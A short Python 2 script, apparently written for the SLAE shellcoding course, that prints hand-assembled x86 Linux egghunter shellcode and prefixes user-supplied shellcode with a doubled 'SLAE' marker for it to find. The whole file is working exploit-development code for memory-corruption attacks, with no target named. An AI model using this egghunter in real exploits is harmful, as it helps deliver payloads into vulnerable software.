#!/usr/bin/python
# generator.py
#  - Generate an egghunter for a given payload

import sys

if (len(sys.argv) != 2):
	print "Usage: %s \"<shellcode>\"" % sys.argv[0]
	sys.exit()

tag = "\\x53\\x4c\\x41\\x45"	# SLAE
code = sys.argv[1]
egghunter = (
"\\x66\\x81\\xca\\xff\\x0f\\x42\\x31\\xc0\\xb0\\x21"
"\\x8d\\x5a\\x04\\x31\\xc9\\xcd\\x80\\x3c\\xf2\\x74"
"\\xeb\\xb8"+tag+"\\x89\\xd7\\xaf\\x75\\xe6\\xaf"
"\\x75\\xe3\\xff\\xe7"
)

print "Egghunter (%i): \"%s\"" % (len(egghunter)/4, egghunter)
print "Payload (%i): \"%s\"" % (len(code)/4 + 8, tag * 2 + code)
